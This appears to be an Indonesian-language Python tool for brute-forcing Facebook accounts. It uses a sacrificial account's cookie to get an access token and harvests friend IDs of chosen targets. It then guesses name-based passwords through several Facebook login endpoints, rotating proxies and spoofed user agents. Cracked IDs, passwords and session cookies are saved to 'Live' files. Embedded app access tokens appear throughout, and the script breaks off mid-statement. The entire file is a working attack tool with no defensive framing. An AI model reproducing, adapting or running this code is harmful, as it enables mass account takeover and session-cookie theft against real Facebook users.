###-----[ IMPORT MODULE ]-----###import requests,json,os,sys,random,datetime,time,re,uuid,subprocess,zlib,base64from time import time as todfrom time import sleepfrom concurrent.futures import ThreadPoolExecutor as tredfrom bs4 import BeautifulSoup as parfrom urllib import requestfrom platform import platformfrom urllib.error import URLErrorses = requests.Session()###-----[ IMPORT RICH ]-----###from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumnfrom rich.markdown import Markdown as markfrom rich.console import Console as solfrom rich.panel import Panel as panelfrom rich import print as printsfrom rich.tree import Treefrom rich.console import Consolefrom rich.columns import Columnswa = Console()###-----[ APPEN AND MORE ]-----###id,uid2,loop,ok,cp,method,uid= [],[],0,0,0,[],[]uadia, uadarimu = [],[]password_list,password_input= [],[]pwpluss,pwnya=[],[]ugen = []rr = random.randintrc = random.choice###-----[ USERAGENT MENU ]-----###try:	url = ses.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text	open(".proxy.txt","w").write(url)except:	passdef generateuseragentmozilla():	versii__ = rc(["9","10","11","12","13"])	versii___ = rr(10,110)	versii____ = rr(6,9)	user1 = f"Mozilla/5.0 (Linux; U; Android {versii__}; Lenovo A7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,105))}.0.{str(rr(2000,2999))}.89 Mobile Safari/537.36 OPR/44.1.2254.142659"	user2 = f"Mozilla/5.0 (LG-T375 AppleWebkit/531 Browser/Phantom/V{str(rr(1,9))}.0 Widget/LGMW/3.0 MMS/LG-MMS-V1.0/{str(rr(1,9))}.2 Java/ASVM/{str(rr(1,9))}.1 Profile/MIDP-{str(rr(1,9))}.1 Configuration/CLDC-{str(rr(1,9))}.1) UNTRUSTED/{str(rr(1,9))}.0"	user3 = f"Mozilla/5.0 (Linux; U; Android 10; id-id; MI 8 Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,105))}.0.{str(rr(4000,4999))}.{str(rr(100,130))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.22.1-gn"	user4 = f"Mozilla/5.0 (Linux; U; Android {versii__}; zh-hk; Xiaomi 13 Build/TKQ1.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,105))}.0.{str(rr(4000,4999))}.{str(rr(100,130))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.25.2-gn"	uaappend = rc([user1,user2])	return uaappenddef generateuseragentdalvik():	versi = random.choice(['8','9','10','11','12','13'])	versi_apk = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))	versi_app = random.randint(410000000,499999999)	simcard = random.choice(["INDOSAT","Indosat Ooredoo"])	model = random.choice(["CPH2343 Build/RKQ1.211119.001"])	density = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"	return (f"Dalvik/2.1.0 (Linux; U; Android {versi}) [FBAN/MessengerLite;FBAV/{versi_apk};FBPN/com.facebook.mlite;FBLC/jv_ID;FBBV/{versi_app};FBCR/Indosat Ooredoo;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Mi 10 Pro;FBSV/{versi};FBCA/arm64-v8a:null;FBDM/"+density+";]")#prints(generateuseragentmozilla());time.sleep(3)###-----[ MENU WARNA PRINT BIASA ]-----###P = '\x1b[1;97m' # PUTIHM = '\x1b[1;91m' # MERAHH = '\x1b[1;92m' # HIJAUK = '\x1b[1;93m' # KUNINGB = '\x1b[1;94m' # BIRUU = '\x1b[1;95m' # UNGUO = '\x1b[1;96m' # BIRU MUDAN = '\x1b[0m'	# WARNA MATI###-----[ MENU WARNA PRINT RICH ]-----###M2 = "[#FF0000]" # MERAHH2 = "[#00FF00]" # HIJAUK2 = "[#FFFF00]" # KUNINGB2 = "[#00C8FF]" # BIRUP2 = "[#FFFFFF]" # PUTIHP3 = "italic white"###-----[ TANGGAL BULAN TAHUN ]-----###dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'July','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}tgl = datetime.datetime.now().daybln = dic[(str(datetime.datetime.now().month))]thn = datetime.datetime.now().yearokc = 'Live-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'cpc = 'Chek-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'def waktu():	now = datetime.datetime.now()	hours = now.hour	if 4 <= hours < 12:timenow = "Selamat Pagi ðŸ‘‹"	elif 12 <= hours < 15:timenow = "Selamat Siang ðŸ‘‹"	elif 15 <= hours < 18:timenow = "Selamat Sore ðŸ‘‹"	else:timenow = "Selamat Malam ðŸ‘‹"	return timenow###-----[ CLEAR DISPLAY ]-----###def clear():	if "linux" in sys.platform.lower():		try:os.system("clear")		except:pass	elif "win" in sys.platform.lower():		try:os.system("cls")		except:pass	else:		try:os.system("clear")		except:passdef back():	menu()###-----[ LOGO BANNER ]-----###def banner():	print(f"""{P} {M}███╗░░░███╗██████╗░███████╗████╗░████║██╔══██╗██╔════╝██╔████╔██║██████╦╝█████╗{B}░░{P}██║╚██╔╝██║██╔══██╗██╔══╝{B}░░{P}██║{B}░{P}╚═╝{B}░{P}██║██████╦╝██║{B}░░░░░{P}╚═╝{B}░░░░░{P}╚═╝╚═════╝{B}░{P}╚═╝{B}░░░░░{P} [ Script For Brute Facebook | Coded James ]{P}""")###-----[ LOGIN COOKIES ]-----###def login():	clear();banner()	print(f"\n{P} [%] masukan cookie anda, disarankan menggunakan akun tumbal. {P}")	print(f" [%] untuk menu crack tanpa login ,ketik 'nologin' pada kolom input.")	cok = input(f" [%] cookie : {H}")	if cok in ["Nologin","NOLOGIN","nologin"]:		menu = input(f"\n{P} [1]. crack dari file. \n [2]. dump id dari email. \n [3]. dump id dari pencarian nama. \n [4]. cek hasil crack. \n\n [%] pilih 1/4 : ")		if menu in ["01","1"]:			Crack_file()		elif menu in ["02","2"]:			exit(" [%] fitur ini masih dalam tahap pengembangan.")		elif menu in ["03","3"]:			exit(" [%] fitur ini masih dalam tahap pengembangan.")		elif menu in ["04","4"]:			Result()		else:			exit(" [%] input hanya dengan angka,jangan kosong.")	else:		try:			url = "https://mbasic.facebook.com"			data, data2 = {}, {}			link = ses.post("https://graph.facebook.com/v16.0/device/login/", data={"access_token": "661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e", "scope": ""}).json()			kode = link["code"];user = link["user_code"]			vers = par(ses.get(f"{url}/device", cookies={"cookie": cok}).content, "html.parser")			item = ["fb_dtsg","jazoest","qr"]			for x in vers.find_all("input"):				if x.get("name") in item:					aset = {x.get("name"):x.get("value")}					data.update(aset)			data.update({"user_code":user})			meta = par(ses.post(url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie": cok}).text, "html.parser")			xzxz  = meta.find("form",{"method":"post"})			for x in xzxz("input",{"value":True}):				try:					if x["name"] == "__CANCEL__" : pass					else:data2.update({x['name']:x['value']})				except Exception as e: pass			ses.post(f"{url}{xzxz['action']}", data=data2, cookies={"cookie":cok})			tokz = ses.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e").json()			open('.token.txt', 'a').write(tokz['access_token']);open('.cok.txt', 'a').write(cok)			exit(f"{P} [%] token : {H}{tokz['access_token']}{P} \n [%] cookies aktif,jalankan ulang perintah nya dengan ketik python run.py")		except Exception as e:exit(e)###-----[ MENU SCRIPT ]-----###def menu():	clear();banner()	try:		token = open('.token.txt','r').read()		cok = open('.cok.txt','r').read()	except (IOError,KeyError,FileNotFoundError):		print(f'\n{P} [%] cookies kamu invalid.{P}')		time.sleep(3);os.system('clear')		login()	try:		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()		nama = info_datafb["name"]		uidfb = info_datafb["id"]	except requests.exceptions.ConnectionError:		exit(f"\n{P} [%] Tidak ada koneksi{P}")	except KeyError:		try:os.remove(".cok.txt");os.remove(".token.txt")		except:pass		print(f"\n{P} [%] sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(3)		os.system('clear')		login()	prints(f"\n [%] uid facebook  : {uidfb} \n [%] nama facebook : {nama}")	print(f"\n{P} [1]. crack dari id publik. \n [2]. crack dari id publik {H}massal{P}. \n [3]. crack id dari file. \n [4]. dump id ke file. \n [0]. keluar {M}hapus cookies{P}. {P}")	menu = input(f'\n{P} [%] pilih 1/5 : ')	if menu in ["01","1"]:		try:			token = open('.token.txt','r').read()			cok = open('.cok.txt','r').read()		except IOError:			exit()		print(f"\n{P} [%] pastikan id target tidak private/publik. {P}")		user_dump = input(f' [%] input id target : ')		uid.append(user_dump)		for userr in uid:			try:				col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name).limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()				for x in col['friends']['data']:					try:						sys.stdout.write(f"\r [%] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),						sys.stdout.flush()						id.append(x['id']+'|'+x['name'])					except:continue			except (KeyError,IOError):				pass			except requests.exceptions.ConnectionError:				print(f' [%] koneksi buruk, silahkan refresh jaringan anda. ')				exit()		try:			setting()		except requests.exceptions.ConnectionError:			print(f'\n [%] koneksi buruk, silahkan refresh jaringan anda. ')			exit()	elif menu in ["02","2"]:		Dump_Massal()	elif menu in ["03","3"]:		Crack_file()	elif menu in ["04","4"]:		Dump_id()	elif menu in ['00','0']:		os.system('rm -rf .token.txt')		os.system('rm -rf .cookie.txt')		print(f' [%] Berhasil Keluar+Hapus Cookie ')		exit()	else:		print(f" [%] input hanya dengan angka,jangan kosong.")		time.sleep(3)		back()###-----[ MENU RESULT ]-----###def Result():	print(f"\n{P} [1]. cek hasil akun {H}Live{P}. \n [2]. cek hasil akun {K}Chek{P}. \n [3]. kembali.")	lihat_result = input(f'\n [%] pilih 1/3 : ')	if lihat_result in ['2']:		try:vin = os.listdir('Chek')		except FileNotFoundError:			print(f' [%] file tidak ditemukan ')			time.sleep(2)			back()		if len(vin)==0:			print(f' [%] anda tidak memiliki file {K}Check {P}')			time.sleep(2)			back()		else:			cih = 0			lol = {}			for isi in vin:				try:hem = open('Chek/'+isi,'r').readlines()				except:continue				cih+=1				if cih<10:					nom = str(cih)					lol.update({str(cih):str(isi)})					lol.update({nom:str(isi)})					print(f'{P} [%s]. %s ( {K}%s{P} id )'%(nom,isi,len(hem)))				else:					lol.update({str(cih):str(isi)})					print(f'{P} [%s]. %s ( {K}%s{P} id )'%(cih,isi,len(hem)))			geeh = input(f'\n [%] masukan nomer result yang ingin anda cek : ')			try:geh = lol[geeh]			except KeyError:				print(f' [%] pilih dengan benar ')				back()			try:lin = open('Chek/'+geh,'r').read().splitlines()			except:				print(f' [%] file tidak ditemukan ')				time.sleep(2)				back()			nocp=0			for cpku in range(len(lin)):				result_=lin[nocp].split('|')				tree = Tree("")				tree.add(f"{K2}{result_[0]}|{result_[1]}[white]")				prints(tree)				nocp +=1			print('')			input(f' [%] ketik enter jika ingin kembali ke menu')			os.system("clear")			time.sleep(3)			back()	elif lihat_result in ['1']:		try:vin = os.listdir('Live')		except FileNotFoundError:			print(f' [%] file tidak ditemukan ')			time.sleep(2)			back()		if len(vin)==0:			print(f' [%] anda tidak memiliki file {H}Live {P}')			time.sleep(2)			back()		else:			cih = 0			lol = {}			for isi in vin:				try:hem = open('Live/'+isi,'r').readlines()				except:continue				cih+=1				if cih<10:					nom = str(cih)					lol.update({str(cih):str(isi)})					lol.update({nom:str(isi)})					print(f'{P} [%s]. %s ( {H}%s{P} id )'%(nom,isi,len(hem)))				else:					lol.update({str(cih):str(isi)})					print(f'{P} [%s]. %s ( {H}%s{P} id )'%(cih,isi,len(hem)))			geeh = input(f'\n [%] masukan nomer result yang ingin anda cek : ')			try:geh = lol[geeh]			except KeyError:				print(f' [%] pilih dengan benar ')				back()			try:lin = open('Live/'+geh,'r').read().splitlines()			except:				print(f' [%] file tidak ditemukan ')				time.sleep(2)				back()			nocp=0			for cpku in range(len(lin)):				result_=lin[nocp].split('|')				tree = Tree("")				tree.add(f"{H2}{result_[0]}|{result_[1]}[white]").add(f"{H2}{result_[2]}[white]")				prints(tree)				nocp +=1			print("")			input(f' [%] ketik enter jika ingin kembali ke menu')			os.system("clear")			time.sleep(3)			back()	elif lihat_result in ['3']:		back()	else:		print(f" [%] input hanya dengan angka,jangan kosong.")		back()###-----[ DUMP PUBLIK MASSAL ]-----###def Dump_Massal():	try:		token = open('.token.txt','r').read()		cok = open('.cok.txt','r').read()	except IOError:		exit()	try:		print(f"\n{P} [%] pastikan id target tidak private/publik. {P}")		jum = int(input(f' [%] input jumlah target ? : '))	except ValueError:		print(f' [%] input salah ')		exit()	if jum<1 or jum>100:		print(f' [%] gagal dump id kemungkinan id bukan publik/private ')		exit()	ses=requests.Session()	jumlah_input = 0	for met in range(jum):		jumlah_input+=1		user_dump = input(f' [%] input id ke '+str(jumlah_input)+' : ')		uid.append(user_dump)	for userr in uid:		try:			col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name).limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()			for x in col['friends']['data']:				try:					sys.stdout.write(f"\r [%] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),					sys.stdout.flush()					id.append(x['id']+'|'+x['name'])				except:continue		except (KeyError,IOError):			pass		except requests.exceptions.ConnectionError:			print(f' [%] koneksi sinyal tidak stabil ')			exit()	try:		setting()	except requests.exceptions.ConnectionError:		print('')		print(f' [%] koneksi sinyal tidak stabil ')		back()###-----[ DUMP FILE ]-----###def Dump_id():	file = input(f"\n [%] masukan nama file dump anda : ")	try:		token = open('.token.txt','r').read()		cok = open('.cok.txt','r').read()	except IOError:		exit()	try:		print(f"\n{P} [%] pastikan id target tidak private/publik. {P}")		jum = int(input(f' [%] input jumlah target ? : '))	except ValueError:		print(f' [%] input salah ')		exit()	if jum<1 or jum>100:		print(f' [%] gagal dump id kemungkinan id bukan publik/private ')		exit()	ses=requests.Session()	jumlah_input = 0	for met in range(jum):		jumlah_input+=1		user_dump = input(f' [%] input id ke '+str(jumlah_input)+' : ')		uid.append(user_dump)	for userr in uid:		try:			col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name).limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()			for x in col['friends']['data']:				try:					sys.stdout.write(f"\r [%] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),					sys.stdout.flush()					id.append(x['id']+'|'+x['name'])					open(file,'a').write(x['id']+'|'+x['name']+'\n')				except:continue		except (KeyError,IOError):			pass		except requests.exceptions.ConnectionError:			print(f' [%] koneksi sinyal tidak stabil ')			exit()	try:		exit(f"\n [%] sukses dump file tersimpan pada : {file}")	except KeyError:		print(f"\n [%] gagal dump, kemungkinan id tidak publik/cookies anda invalid")	except requests.exceptions.ConnectionError:		print('')		print(f' [%] koneksi sinyal tidak stabil ')		back()###-----[ CRACK FILE ]-----###def Crack_file():	file = input(f"\n [%] masukan nama folder/file : ")	try:		uid = open(file,"r").read().splitlines()		for data in uid:			try:user,nama = data.split('|')			except:continue			sys.stdout.write(f"\r [%] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),			sys.stdout.flush()			id.append(data)	except FileNotFoundError:exit(f" [%] file tidak ada")	setting()###-----[ SETTING URUTAN & METODE ]-----###def setting():	print("")	print(f"\n{P} [1]. urutan old ke new. \n [2]. urutan new ke old. \n [3]. urutan random. {P}")	urutan_setting = input(f'\n [%] pilih 1/3 : ')	if urutan_setting in ['1','01','old']:		for tua in sorted(id):			uid2.append(tua)	elif urutan_setting in ['2','02','new']:		muda=[]		for new in sorted(id):			muda.append(new)		bcm=len(muda)		bcmi=(bcm-1)		for xmud in range(bcm):			uid2.append(muda[bcmi])			bcmi -=1	elif urutan_setting in ['3','03','random']:		for acak in id:			xx = random.randint(0,len(uid2))			uid2.insert(xx,acak)	else:		print(f" [%] input hanya dengan angka,jangan kosong.")		exit()	print(f"\n{P} [1]. login metode validate. \n [1]. login metode async. \n [3]. login metode API. {P}")	login_metode = input(f'\n [%] pilih 1/3 : ')	if login_metode in ["1","01"]:		method.append('Validate')	elif login_metode in ["2","02"]:		method.append('Regular')	elif login_metode in ["3","03"]:		method.append('Api')	else:		print(f" [%] input hanya dengan angka,jangan kosong.")		exit()	print(f"\n{P} [1]. password otomatis. \n [2]. password gabung. \n [3]. password manual. {P}")	password_metode = input(f'\n [%] pilih 1/3 : ')	if password_metode in ['1','01']:		Otomatis()	elif password_metode in ['2','02']:		Gabung()	elif password_metode in ['3','03']:		Manual()	else:		print(f" [%] input hanya dengan angka,jangan kosong.")		exit()###-----[ SETTING PASSWORD OTOMATIS ]-----###def Otomatis():	ua = input(f' [%] ingin menggunakan user agent manual ? y/t : ')	if ua in ['y','Ya','ya','Y']:		uadarimu.append('uadia');bz = input(f' [%] input user agent manual anda : ');uadia.append(bz)	if ua in ['t','T','']:		print(f"{P} [%] anda menggunakan user agent bawaan script. {P}")	else:uadarimu.append('uasc')	print(f""" [%] {P}hasil Live akan tersimpan di : {H}Live/{okc}{P} [%] {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P} [%] mainkan mode pesawat jika tidak ada hasil.""")	global prog,des	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn("[progress.percentage]{task.percentage:>3.0f}%"))	des = prog.add_task('',total=len(uid2))	with prog:		with tred(max_workers=30) as MethodeCrack:			for user in uid2:				uid,nama = user.split('|')[0],user.split('|')[1].lower()				depan = nama.split(" ")				try:					if len(nama) <=5:						if len(depan) <=1 or len(depan) <=2:pass						else:							pasw = [nama,depan[0]+"123",depan[0]+"1234",depan[0]+"12345"]					else:						pasw = [nama,depan[0]+"123",depan[0]+"1234",depan[0]+"12345"]					if 'Validate' in method:						MethodeCrack.submit(Validate,uid,pasw)					elif 'Regular' in method:						MethodeCrack.submit(Regular,uid,pasw)					elif 'Api' in method:						MethodeCrack.submit(Api,uid,pasw)					else:						MethodeCrack.submit(Api,uid,pasw)				except:pass		print("\r")		exit(f"{P} [%] sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")###-----[ SETTING PASSWORD GABUNG ]-----###def Gabung():	pw_manual=input(f'\n [%] input password tambahan anda : ')	password_manual=pw_manual.split(',')	for xpw in password_manual:		pwnya.append(xpw)	ua = input(f' [%] ingin menggunakan user agent manual ? y/t : ')	if ua in ['y','Ya','ya','Y']:		uadarimu.append('uadia');bz = input(f' [%] input user agent manual anda : ');uadia.append(bz)	if ua in ['t','T','']:		print(f"{P} [%] anda menggunakan user agent bawaan script. {P}")	else:uadarimu.append('uasc')	print(f""" [%] {P}hasil Live akan tersimpan di : {H}Live/{okc}{P} [%] {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P} [%] mainkan mode pesawat jika tidak ada hasil.""")	global prog,des	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn("[progress.percentage]{task.percentage:>3.0f}%"))	des = prog.add_task('',total=len(uid2))	with prog:		with tred(max_workers=40) as MethodeCrack:			for user in uid2:				uid,nama = user.split('|')[0],user.split('|')[1].lower()				depan = nama.split(" ")				try:					if len(nama) <=5:						if len(depan) <=1 or len(depan) <=2:pass						else:							pasw = [nama]					else:						pasw = [nama]					for xpwd in pwnya:						pasw.append(xpwd)					if 'Validate' in method:						MethodeCrack.submit(Validate,uid,pasw)					elif 'Regular' in method:						MethodeCrack.submit(Regular,uid,pasw)					elif 'Api' in method:						MethodeCrack.submit(Api,uid,pasw)					else:						MethodeCrack.submit(Api,uid,pasw)				except:pass		print("\r")		exit(f"{P} [%] sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")###-----[ SETTING PASSWORD MANUAL ]-----###def Manual():	pw_manual=input(f'\n [%] input password manual anda : ')	password_manual=pw_manual.split(',')	for xpw in password_manual:		pwnya.append(xpw)	ua = input(f' [%] ingin menggunakan user agent manual ? y/t : ')	if ua in ['y','Ya','ya','Y']:		uadarimu.append('uadia');bz = input(f' [%] input user agent manual anda : ');uadia.append(bz)	if ua in ['t','T','']:		print(f"{P} [%] anda menggunakan user agent bawaan script. {P}")	else:uadarimu.append('uasc')	print(f""" [%] {P}hasil Live akan tersimpan di : {H}Live/{okc}{P} [%] {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P} [%] mainkan mode pesawat jika tidak ada hasil.""")	global prog,des	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn("[progress.percentage]{task.percentage:>3.0f}%"))	des = prog.add_task('',total=len(uid2))	with prog:		with tred(max_workers=30) as MethodeCrack:			for user in uid2:				uid,nama = user.split('|')[0],user.split('|')[1].lower()				pasw = []				for xpwd in pwnya:					pasw.append(xpwd)				if 'Validate' in method:					MethodeCrack.submit(Validate,uid,pasw)				elif 'Regular' in method:					MethodeCrack.submit(Regular,uid,pasw)				elif 'Api' in method:					MethodeCrack.submit(Api,uid,pasw)				else:					MethodeCrack.submit(Api,uid,pasw)		print("\r")		exit(f"{P} [%] sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")###-----[ METODE VALIDATE ]-----###def Validate(uid,pasw):	global loop,ok,cp	prog.update(des,description=f"{P2} [%] {str(loop)}/{len(uid2)} Live:-{H}{ok}{P} Chek:-{K}{cp}{P}")	prog.advance(des)	ses = requests.Session()	for pw in pasw:		try:			if 'uadia' in uadarimu: ua = uadia[0]			else:ua = generateuseragentmozilla()			prox = open(".proxy.txt","r").read().splitlines()			proxy= {"http": f"socks5://{random.choice(prox)}"}			link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&_rdr")			data = {			   "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),			   "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),			   "uid": uid,			   "next":"https://m.facebook.com/",			   "flow":"login_no_pin",			   "pass": pw}			headers = {			   "Host":"m.facebook.com",			   "content-length":"243",			   "cache-control":"max-age=0",			   "sec-ch-ua":'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',			   "sec-ch-ua-mobile":"?0",			   "sec-ch-ua-platform":'"Linux"',			   "upgrade-insecure-requests":"1",			   "origin":"https://m.facebook.com",			   "content-type":"application/x-www-form-urlencoded",			   "user-agent":ua,			   "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",			   "sec-fetch-site":"same-origin",			   "sec-fetch-mode":"navigate",			   "sec-fetch-user":"?1",			   "sec-fetch-dest":"document",			   "referer":f"https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&_rdr",			   "accept-encoding":"gzip, deflate, br",			   "accept-language":"id-ID,id;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6"}			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=headers,allow_redirects=False)			if "c_user" in ses.cookies.get_dict():				ok+=1				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])				tree = Tree("")				tree.add(f"{H2}{uid}|{pw}{P2}").add(f"{H2}{kuki}{P2}")				prints(tree)				open('Live/'+okc,'a').write(f" [âœ“] {uid}|{pw}|{kuki}\n")				break			elif "checkpoint" in ses.cookies.get_dict():				cp+=1				tree = Tree("")				tree.add(f"{K2}{uid}|{pw}{P2}")				prints(tree)				open('Chek/'+cpc,'a').write(f" [Ã—] {uid}|{pw}\n")				break			else:				continue		except requests.exceptions.ConnectionError:			time.sleep(15)	loop+=1###-----[ METODE REGULAR ]-----###def Regular(uid,pasw):	global loop,ok,cp	prog.update(des,description=f"{P2} [{H2}/{P2}] {str(loop)}/{len(uid2)} Live:-{H}{ok}{P} Chek:-{K}{cp}{P}")	prog.advance(des)	ses = requests.Session()	for pw in pasw:		try:			if 'uadia' in uadarimu: ua = uadia[0]			else:ua = generateuseragentmozilla()			link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")			data = {			   "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),			   "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),			   "try_number": "0",			   "unrecognized_tries": "0",			   "email": uid,			   "prefill_contact_point": f"{uid} {pw}",			   "prefill_source": "browser_dropdown",			   "prefill_type": "password",			   "first_prefill_source": "browser_dropdown",			   "first_prefill_type": "contact_point",			   "had_cp_prefilled": True,			   "had_password_prefilled": True,			   "is_smart_lock": False,			   "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),			   "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',			   "encpass": f"#PWD_BROWSER:0:{str(tod()).split('.')[0]}:{pw}",			   "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),			   "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)}			header = {			   "Host": "m.facebook.com",			   "content-length": "2153",			   "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),			   "sec-ch-ua": '"Not A(Brand";v="24", "Chromium";v="110"',			   "content-type": "application/x-www-form-urlencoded",			   "x-asbd-id": "198387",			   "sec-ch-ua-mobile": "?1",			   "user-agent": ua,			   "sec-ch-ua-platform": '"Android"',			   "accept": "*/*",			   "origin": "https://m.facebook.com",			   "sec-fetch-site": "same-origin",			   "sec-fetch-mode": "cors",			   "sec-fetch-dest": "empty",			   "referer": "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",			   "accept-encoding": "gzip, deflate, br",			   "accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6"}			po = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data,headers=header,allow_redirects=False)			if "c_user" in ses.cookies.get_dict():				ok+=1				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])				print(f"\r{P} *----> {H}{uid}|{pw}|{kuki}|{ua}{P}")				open('Live/'+okc,'a').write(f" [âœ“] {uid}|{pw}|{kuki}\n")				break			elif "checkpoint" in ses.cookies.get_dict():				cp+=1				print(f"\r{P} *----> {K}{uid}|{pw}          {P}")				open('Chek/'+cpc,'a').write(f" [Ã—] {uid}|{pw}\n")				break			else:				continue		except requests.exceptions.ConnectionError:			time.sleep(15)	loop+=1###-----[ METODE GRAPH ]-----###def Api(uid,pasw):	global loop,ok,cp	prog.update(des,description=f"{P2} [{H2}/{P2}] {str(loop)}/{len(uid2)} Live:-{H}{ok}{P} Chek:-{K}{cp}{P}")	prog.advance(des)	ses = requests.Session()	for pw in pasw:		try:			if 'uadia' in uadarimu: ua = uadia[0]			else:ua = generateuseragentdalvik()			ykh = random.randint(2e7, 3e7)			iyh = random.randint(2e4, 4e4)			headers = {			   "Host":"graph.facebook.com",			   "x-fb-connection-bandwidth":repr(ykh),			   "x-fb-sim-hni":repr(iyh),			   "x-fb-net-hni":repr(iyh),			   "x-fb-connection-quality":"EXCELLENT",			   "user-agent":ua,			   "content-type":"application/x-www-form-urlencoded",			   "x-fb-http-engine":"Liger"}			params = {			   "access_token":"200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",			   "format":"JSON",			   "sdk_version":{random.randrange(2, 31)},			   "email":uid,			   "locale":"jv_ID",			   "password":pw,			   "sdk":"android",			   "generate_session_cookies":"1",			   "sig":f"{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}"}			xnxx = ses.post("https://graph.facebook.com/auth/login", params=params, headers=headers, allow_redirects=False)			anjg = json.loads(xnxx.text)			if "session_key" in xnxx.text:				ok+=1				coki = anjg["session_cookies"]				cok = {}				for x in coki:					cok.update({x["name"]:x["value"]})				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])				print(f"\r{P} *----> {H}{uid}|{pw}|{kuki}|{ua}{P}")				open('Live/'+okc,'a').write(f" [âœ“] {uid}|{pw}|{kuki}\n")				ok.append(uid)				break			elif "checkpoint" in xnxx.text:				cp+=1				print(f"\r{P} *----> {K}{uid}|{pw}          {P}")				open('Chek/'+cpc,'a').write(f" [Ã—] {uid}|{pw}\n")				cp.append(uid)				break			else:				continue		except requests.exceptions.ConnectionError:			time.sleep(15)	loop+=1if __name__=='__main__':	try:os.mkdir('Live')	